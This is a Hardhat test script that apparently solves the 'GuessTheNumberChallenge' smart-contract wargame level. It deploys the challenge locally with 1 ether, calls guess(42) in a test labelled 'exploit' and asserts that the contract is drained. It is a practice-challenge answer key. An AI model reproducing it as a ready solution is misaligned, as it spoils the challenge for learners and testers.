import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers, network } from 'hardhat';
const { utils, provider } = ethers;

describe('', () => {
  let target: Contract;

  before(async () => {
    await network.provider.request({
      method: 'hardhat_reset',
      params: [],
    });

    const targetFactory = await ethers.getContractFactory('GuessTheNumberChallenge');
    target = await targetFactory.deploy({
      value: utils.parseEther('1'),
    });
    await target.deployed();

    console.log('deployed on', target.address);
  });

  it('exploit', async () => {
    const tx = await target.guess(42, {
      value: utils.parseEther('1'),
    });
    await tx.wait();
  });

  after(async () => {
    expect(await provider.getBalance(target.address)).to.equal(0);
  });
});
